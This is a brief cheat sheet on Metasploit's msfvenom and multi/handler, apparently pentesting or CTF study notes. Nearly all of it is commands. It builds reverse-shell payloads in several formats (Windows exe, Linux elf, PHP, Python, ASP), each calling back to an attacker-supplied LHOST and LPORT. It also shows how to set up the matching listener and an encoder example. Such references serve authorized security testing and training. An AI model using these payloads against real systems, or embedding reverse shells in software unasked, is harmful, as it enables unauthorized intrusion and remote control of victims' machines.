# Msfvenom & Handlers

Msfvenom generates custom payloads (replacement for Msfpayload and Msfencode). Handlers catch the connection.

## Msfvenom Basics

## List Payloads and Formats



`msfvenom -l payloads`



`msfvenom --list formats`

## Standard Syntax



`msfvenom -p [payload] LHOST=[your_ip] LPORT=[your_port] -f [format] > [output_file]`

## Common Payloads

## Windows Executable (.exe)



`msfvenom -p windows/meterpreter/reverse_tcp LHOST=[IP] LPORT=[PORT] -f exe > rev_shell.exe`

## Linux Executable (.elf)



`msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=[IP] LPORT=[PORT] -f elf > rev_shell.elf`

Don't forget to run `chmod +x rev_shell.elf` on the target!

## PHP Reverse Shell (.php)



`msfvenom -p php/meterpreter_reverse_tcp LHOST=[IP] LPORT=[PORT] -f raw > rev_shell.php`

⚠️ Often you need to manually add `<?php` at the beginning and `?>` at the end.

## Python Script (.py)



`msfvenom -p cmd/unix/reverse_python LHOST=[IP] LPORT=[PORT] -f raw > rev_shell.py`

## ASP Script (.asp)



`msfvenom -p windows/meterpreter/reverse_tcp LHOST=[IP] LPORT=[PORT] -f asp > rev_shell.asp`

## Multi Handler (Listener)

To catch reverse shells, you must always start a listener that matches your payload.

## Listener Setup



`use exploit/multi/handler`



`set payload [payload_used_in_msfvenom]`



`set LHOST [your_ip]`



`set LPORT [your_port]`



`run`

## Encoders

Encoders (like Shikata Ga Nai) encrypt the payload, but are rarely enough to bypass modern antivirus.

## Encoder Example



`msfvenom -p php/meterpreter/reverse_tcp LHOST=[IP] -f raw -e php/base64`

---

